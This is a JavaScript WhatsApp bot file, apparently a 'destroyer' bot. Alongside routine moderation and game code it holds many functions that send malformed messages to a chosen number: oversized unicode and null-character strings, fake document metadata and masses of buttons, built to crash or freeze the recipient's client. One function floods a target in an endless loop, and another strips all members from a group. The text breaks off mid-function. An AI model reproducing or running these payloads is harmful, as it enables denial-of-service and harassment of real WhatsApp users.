require("./gutoxtaz/config")
const { generateMessageIDV2, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, makeInMemoryStore, fetchLatestBaileysVersion, getFileBuffer,  makeCacheableSignalKeyStore, tempo, makeWaSocket, delay } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const path = require('path')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const os = require('os')
module.exports = async (uwu, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
//Não há necessidade de fazer nada se você não quiser erros
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./gutoxtaz/lib/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (uwu.user.id.split(':')[0]+'@s.whatsapp.net' || uwu.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await uwu.decodeJid(uwu.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isDeveloper = (m && m.sender && global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await uwu.groupMetadata(m.chat).catch(e => {}) : null
const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : '';
const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const cd = require('./gutoxtaz/lib/countdown')
let usersdb = global.db.data.users
fs.writeFileSync('./gutoxtaz/database/database.json', JSON.stringify(global.db, null, 2))
const isPremium = isCreator ? true : cd.isPremium(usersdb, m.sender)
const isRentBotUser = isDeveloper ? true : cd.isPremium(usersdb, m.sender)
var Procurar_String = m.message?.conversation || m.message?.viewOnceMessageV2?.message?.imageMessage?.caption || m.message?.viewOnceMessageV2?.message?.videoMessage?.caption || m.message?.imageMessage?.caption || m.message?.videoMessage?.caption || m.message?.extendedTextMessage?.text || m.message?.viewOnceMessage?.message?.videoMessage?.caption || m.message?.viewOnceMessage?.message?.imageMessage?.caption || m.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || m.message?.buttonsMessage?.imageMessage?.caption || ""
const budy2 = body.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

const seloMeta = {"key": {"participant": "13135550002@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "Meta IA", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Chat GPT;;;\nFN:Meta IA\nitem1.TEL;waid=13135550002:13135550002\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};

const menc_prt = m.message?.extendedTextMessage?.contextInfo?.participant

const menc_jid = args?.join(" ").replace("@", "") + "@s.whatsapp.net"

const menc_jid2 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid

const sender_ou_n = q.includes("@") ? menc_jid : sender

const mrc_ou_numero = q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 
const menc_os2 = q.includes("@") ? menc_jid : menc_prt 

const marc_tds = q.includes("@") ? menc_jid : q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 

const mention = (teks= '', ms = m) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
uwu.sendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: ms}) 
}

if (m.message && m.isGroup) {
  console.log(chalk.magenta(`Mensagem de Grupo : `) + '\n' + chalk.magenta('=> De : '), chalk.green(pushname) + '\n' + chalk.magenta('=> Grupo : '), chalk.green(groupName))
  console.log(chalk.whiteBright('[ Mensagem ] : '), chalk.black(chalk.bgWhite(budy || m.mtype)))
} else {
  console.log(chalk.green(`Mensagem Privada : `), chalk.magenta('=> De : '), chalk.magenta(pushname))
  console.log(chalk.whiteBright('[ Mensagem ] : '), chalk.black(chalk.bgWhite(budy || m.mtype)))
}

const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const date = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY');

const namoro1 = JSON.parse(fs.readFileSync("./DADOS/database/namoro1.json"))
const namoro2 = JSON.parse(fs.readFileSync("./DADOS/database/namoro2.json"))

if (budy2.toLowerCase() === "sim") {
    if (JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && m.isGroup) {
        C14 = namoro2.map(i => i.id).indexOf(sender)
        C12 = namoro1.map(i => i.usu1).indexOf(namoro2[C14].pedido + "@s.whatsapp.net")
        namoro1[C12].namorados = true
        fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
        namoro1.push({
            usu1: sender,
            usu2: namoro2[C14].pedido,
            namorados: true,
            idgp: from,
            hora: hora,
            data: date
        })
        fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
        namoro2.splice(C14, 1)
        fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2))
        mention(`🥳 Parabéns, @${namoro1[C12].usu1.split('@')[0]}! Seu grande amor, @${sender.split('@')[0]}, aceitou seu pedido de namoro! 💖\n\nAgora vocês são oficialmente um casal! Para ver os detalhes, use o comando: *${prefix}dupla*`)
    }
}

if(budy2.toLowerCase().replace("ã", "a") === "nao") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && m.isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(`${namoro2[C14].pedido}@s.whatsapp.net`)
mention(`Sinto muito @${namoro1[C12].usu1.split('@')[0]}! O (a) @${sender.split('@')[0]} não te ama, deve está confuso(a) ou não preparado(a) e por isso não aceitou o seu pedido de namoro. 😦`)
namoro1.splice(C12, 1)
fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2))
}
}

const thumbnailreply = fs.readFileSync('./luckzMedia/thumb.jpg')
const dirGroup = `./DADOS/grupos/${from}.json`;

const data_IDGP = [{
    name: groupName,
    groupId: from,
    antidoc: false,
    antilinkhard: false,
    wellcome: [{
      bemvindo1: false,
      legendabv: "Olá #numerodele#, seja bem vindo (a)",
      legendasaiu: 0
    }]
}];

if(m.isGroup && !fs.existsSync(dirGroup)){
  fs.writeFileSync(dirGroup, JSON.stringify(data_IDGP, null, 2) + '\n');
}

try {
  var dataGp = m.isGroup ? JSON.parse(fs.readFileSync(dirGroup)) : undefined;
} catch (e){
  fs.writeFileSync(dirGroup, JSON.stringify(data_IDGP));
}

function setGp(index){
fs.writeFileSync(dirGroup, JSON.stringify(index, null, 2) + "\n")}

const isAntiLinkHard = m.isGroup ? dataGp[0].antilinkhard : undefined
const Antidoc = m.isGroup ? dataGp[0].antidoc : undefined
const isWelkom = m.isGroup ? dataGp[0].wellcome[0].bemvindo1 : undefined

const linkRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|\b[a-z0-9-]+\.(com|net|org|br|info|xyz|site|link|store|online|gov|edu|io|me)(\/[^\s]*)?)/gi

if (isAntiLinkHard && !isAdmins && isBotAdmins && !m.key.fromMe) {
  if (linkRegex.test(Procurar_String)) {
    try {
      let groupInvite = await uwu.groupInviteCode(m.chat)
      let isLinkDoGrupo = Procurar_String.includes(`chat.whatsapp.com/${groupInvite}`)

      if (!isLinkDoGrupo) {
        await uwu.sendMessage(m.chat, {
          text: `🚫 Olá @${m.sender.split('@')[0]}, não é permitido enviar links neste grupo.`,
          mentions: [m.sender]
        }, { quoted: m })

        await uwu.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant || m.key.remoteJid
          }
        })
      }
    } catch (err) {
      console.error("Erro ao processar link:", err)
    }
  }
}

if (Antidoc && !isAdmins && isBotAdmins && !m.key.fromMe) {
  if (m.message?.documentMessage) {
    try {
      await uwu.sendMessage(m.chat, {
        text: `📂 Olá @${m.sender.split('@')[0]}, o envio de documentos não é permitido neste grupo.`,
        mentions: [m.sender]
      }, { quoted: m })

      await uwu.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: false,
          id: m.key.id,
          participant: m.key.participant || m.key.remoteJid
        }
      })
    } catch (err) {
      console.error("Erro ao aplicar anti-documento:", err)
    }
  }
}

async function validarNumeroWhatsApp(numero, reply) {
  const nmr = numero.trim().replace(/\D/g, '')
  if (!nmr) {
    reply('❌ Número inválido.')
    return null
  }

  const [result] = await uwu.onWhatsApp(nmr)
  if (!result || !result.exists) {
    reply('❌ Esse número não está registrado no WhatsApp.')
    return null
  }
  return result.jid
}

const reply = (teks) => {
uwu.sendMessage(m.chat, {
text: teks,
contextInfo: {
    externalAdReply: {
        title: botname,
        "thumbnail": thumbnailreply,
        mediaType: 1,
    }
    }
}, {quoted:m})

}
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return uwu.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return uwu.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
const reagir = async (idgp, emj) => {
var reactionMessage = {
react: {
text: emj, 
key: m.key
}
} 
uwu.sendMessage(idgp, reactionMessage)
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
if (!uwu.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('uwu.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Há um erro:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
//let response = `Desculpe, o comando que você deu está errado. Talvez seja isso que você quer dizer:\n\n•> ${prefix+mean}\n•> Semelhanças: ${similarityPercentage}%`
reply(response)
}}   

async function buginvite(isTarget, ptcp = false) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "\u200E" + "ꦾ".repeat(120000),
            jpegThumbnail: thumbnailreply,
            caption: "ꦽ".repeat(120000) + "@\0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "\0".repeat(1020000),
            version: 3
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: !0,
              screen_2_OptIn_1: !0,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "𝓫𝔂 𝓓𝓮𝓼𝓽𝓻𝓸𝔂𝓮𝓻 𝓿0.1",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 25 }, () => "0@s.whatsapp.net"),
        isForwarded: false,
        fromMe: false,
        groupMentions: [
          {
            groupJid: "120363417463799728@g.us",
            groupSubject: "Kuntul",
          },
        ],
      },
    };

    await uwu.relayMessage(isTarget, message, { userJid: isTarget });
  } catch (err) {
    console.error("Error sending newsletter:", err);
  }
}

async function outofsync(number) {
    await uwu.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u200E",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(1020000),
                      version: 3
                    }
                }
            }
        }
    }, { participant: { jid: number}});
}

async function nullInf(isTarget) {
    let count = 0;
  
    while (true) {
      try {
        await outofsync(isTarget)
        await delay(400)
  
        count++;
        console.log(chalk.green(`ENVIANDO`));
  
        if (count % 40 === 0) {
          console.log(chalk.yellow(`PAUSE DE 5 SEGUNDOS`));
          await delay(15000);
        }
      } catch (err) {
        console.error(chalk.red("ERRO"), err.message);
        await delay(5000);
        }
    }
}

async function sendLiveLocationMessage(jid) {
    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
      'viewOnceMessage': {
        'message': {
          'liveLocationMessage': {
            'degreesLatitude': 'p',
            'degreesLongitude': 'p',
            'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + '\u0000'.repeat(300000),
            'sequenceNumber': '0',
            'jpegThumbnail': thumbnailreply
          }
        }
      }
    }), {
      'userJid': jid
    });
    await uwu.relayMessage(jid, messageContent.message, {
        'participant': {
          'jid': jid
        },
        'messageId': messageContent.key.id
    });
}

async function limparGrupoRenomear(groupJid, novoNome, novaDescricao) {
  try {
    const metadata = await uwu.groupMetadata(groupJid);

    const ownerId = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id;

    const participantesParaRemover = metadata.participants
      .filter(p => p.id !== ownerId && p.id !== botNumber)
      .map(p => p.id);

    if (participantesParaRemover.length === 0) {
      await uwu.sendMessage(m.chat, { text: 'Nenhum membro para remover.' });
    } else {
      for (const participante of participantesParaRemover) {
        await uwu.groupParticipantsUpdate(groupJid, [participante], 'remove');
        await delay(10);
      }
    }

    await uwu.groupUpdateSubject(groupJid, novoNome);
    await uwu.groupUpdateDescription(groupJid, novaDescricao);

  } catch (error) {
    console.error('Erro ao limpar e renomear grupo:', error);
  }
}

async function trashinfinity(target) {
  let virtex = "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣";
  uwu.relayMessage(target, {
      groupMentionedMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      documentMessage: {
                          url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                          mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                          fileLength: "99999999999",
                          pageCount: 0x9184e729fff,
                          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                          fileName: virtex,
                          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                          directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                          mediaKeyTimestamp: "1715880173",
                          contactVcard: true
                      },
                      hasMediaAttachment: true
                  },
                  body: {
                      text: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                  },
                  nativeFlowMessage: {},
                  contextInfo: {
                      mentionedJid: Array.from({
                          length: 5
                      }, () => "1@newsletter"),
                      groupMentions: [{
                          groupJid: "1@newsletter",
                          groupSubject: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣"
                      }]
                  }
              }
          }
      }
  }, {
      participant: {
          jid: target
      }
  })
}

async function nativemessage(target) {
  uwu.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: thumbnailreply,
                },
                hasMediaAttachment: true,
                },
                body: {
                  text:
                    "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣⭑̤\n" +
                    "ꦾ".repeat(10000) +
                    `@1`.repeat(10000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: [
                    "1@newsletter",
                    "1@newsletter",
                    "1@newsletter",
                    "1@newsletter",
                    "1@newsletter",
                  ],
                  groupMentions: [
                    {
                      groupJid: "1@newsletter",
                      groupSubject: "Destroyer",
                    },
                  ],
                                    nativeFlowMessage: {
                          buttons: [
                              {
                                  name: "call_permission_request",
                                  buttonParamsJson: {}
                              }
                          ]
                      },  
                  quotedMessage: {
                  locationMessage: {
                    degreesLatitude: 1.0,
                    degreesLongitude: 5.0,
                    },
                  },
                },
              },
            },
          },
        },
        {
          participant: { jid: target },
          userJid: target,
        }
      )
}

async function CrlButton(isTarget) {
  const msg = generateWAMessageFromContent(
      isTarget,
      {
          viewOnceMessage: {
              message: {
                  interactiveMessage: {
                      body: {
                          text: `\u0000`
                      },
                      carouselMessage: {
                          cards: [
                              {
                                  header: {
                                      ...(await prepareWAMessageMedia(
                                          { image: { url: "https://files.catbox.moe/wmmjgf.png" } }, 
                                          { upload: uwu.waUploadToServer }
                                      )),
                                      title: `\u0000`,
                                      gifPlayback: true,
                                      subtitle: '\u0000',
                                      hasMediaAttachment: true
                                  },
                                  body: {
                                      text:"𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣" + "ꦾ".repeat(120000)
                                  },
                                  footer: {
                                      text: "\u0000"
                                  },
                                  nativeFlowMessage: {
                                      buttons: [
                                          {
                                              name: "single_select",
                                              buttonParamsJson: JSON.stringify({
                                                  title: "",
                                                  sections: []
                                              })
                                          },
                                          {
                                              name: "single_select",
                                              buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" Eu vou matar você ","rows":[]}]}`
                                          },
                                          {
                                              name: "call_permission_request",
                                              buttonParamsJson: "{}"
                                          },
                                          {
                                              name: "mpm",
                                              buttonParamsJson: "{}"
                                          },
                                          {
                                              name: "single_select",
                                              buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                          },
                                          {
                                              name: "quick_reply",
                                              buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                          },
                                          {
                                              name: "cta_url",
                                              buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://whatsapp.com/channel/0029VbBFr1sFCCoVoxMhYw3X\",\"merchant_url\":\"https://whatsapp.com/channel/0029VbBFr1sFCCoVoxMhYw3X\"}"
                                          },
                                          {
                                              name: "cta_call",
                                              buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                          },
                                          {
                                              name: "cta_copy",
                                              buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                          },
                                          {
                                              name: "cta_reminder",
                                              buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                          },
                                          {
                                              name: "cta_cancel_reminder",
                                              buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                          },
                                          {
                                              name: "address_message",
                                              buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                          },
                                          {
                                              name: "send_location",
                                              buttonParamsJson: "\u0000"
                                          }
                                      ]
                                  }
                              }
                          ],
                          messageVersion: 1,
                      }
                  }
              }
          }
      },
      { quoted: q }
  );
  await uwu.relayMessage(isTarget, msg.message, {
      messageId: msg.key.id,
  })
}

async function Blanking(isTarget) {
  let msg = generateWAMessageFromContent(isTarget, proto.Message.fromObject({
      viewOnceMessage: {
          message: {
              interactiveMessage: {
                  contextInfo: {
                      mentionedJid: [isTarget],
                      isForwarded: true,
                      forwardingScore: 999,
                      forwardedNewsletterMessageInfo: {
                          newsletterJid: "120363409362506610@newsletter",
                          newsletterName: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣",
                          serverMessageId: 1
                      }
                  },
                  header: {
                      title: "",
                      ...(await prepareWAMessageMedia({
                          image: {
                              url: "https://files.catbox.moe/wmmjgf.png",
                              gifPlayback: true
                          }
                      }, {
                          upload: uwu.waUploadToServer,
                          mediaType: "image"
                      })),
                      hasMediaAttachment: true
                  },
                  body: {
                      text: ""
                  },
                  footer: {
                      text: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣"
                  },
                  nativeFlowMessage: {
                      buttons: [{
                              name: "single_select",
                              buttonParamsJson: `{"title":"${"ꦾ".repeat(60000)}","sections":[{"title":"Flow Button","rows":[]}]}`
                          },
                          {
                              name: "quick_reply",
                              buttonParamsJson: `{"display_text": "", "id": ""}`
                          },
                          {
                              name: "cta_url",
                              buttonParamsJson: `{"display_text": "", "url": "", "merchant_url": ""}`
                          },
                          {
                              name: "mpm",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payment_method",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "call_permission_request",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "form_message",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "wa_payment_learn_more",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "wa_payment_transaction_details",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "wa_payment_fbpin_reset",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "catalog_message",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payment_info",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "review_order",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "send_location",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payments_care_csat",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "view_product",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payment_settings",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "address_message",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "automated_greeting_message_view_catalog",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "open_webview",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "message_with_link_status",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payment_status",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "extensions_message_v2",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "landline_call",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "review_and_pay",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "galaxy_message",
                              buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "luckzinios@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
                              version: 3
                          }
                      ]
                  }
              }
          }
      }
  }), {
      userJid: isTarget,
      quoted: null
  });

  await uwu.relayMessage(isTarget, msg.message, {
      messageId: msg.key.id
  })
}

async function darkflower(target) {
  let Msg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣" + "ꦾ".repeat(77777), 
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
          },
        },
      },
    },
  };

  await uwu.relayMessage(target, Msg, {
    participant: { jid: target },
  })
}

async function VPen(zLoc, ptcp = false) {
  let valhalla = "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣" + "ꦾ".repeat(50000);

  let mentionedJidArray = Array.from({ length: 35000 }, () => 
      "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
  );

  let battanz = {
      groupMentionedMessage: {
          message: {
              listResponseMessage: {
                  title: " @120363326274964194@g.us",
                  listType: "SINGLE_SELECT",
                  singleSelectReply: {
                      selectedRowId: "Gateway To Hell"
                  },
                  description: " @120363326274964194@g.us",
                  contextInfo: {
                      mentionedJid: mentionedJidArray,
                      groupMentions: [{ 
                          groupJid: "120363326274964194@g.us", 
                          groupSubject: valhalla 
                      }]
                  }
              }
          }
      }
  };

  await uwu.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
async function AnakKucai(target, Ptcp = true) {
  try {
    await uwu.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
